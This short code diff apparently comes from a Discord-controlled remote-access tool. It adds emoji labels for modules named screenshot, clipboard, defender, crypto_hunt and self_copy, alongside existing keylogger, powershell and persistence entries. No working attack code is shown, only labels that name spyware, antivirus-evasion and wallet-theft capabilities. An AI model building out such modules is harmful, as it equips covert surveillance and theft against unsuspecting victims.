@@ -42,6 +42,11 @@ MODULE_EMOJI = {
     "keylogger": "⌨️",
     "powershell": "⚡",
     "persistence": "📌",
+    "screenshot": "🖥️",
+    "clipboard": "📋",
+    "defender": "🛡️",
+    "crypto_hunt": "₿",
+    "self_copy": "📎",
 }
 
 intents = discord.Intents.default()
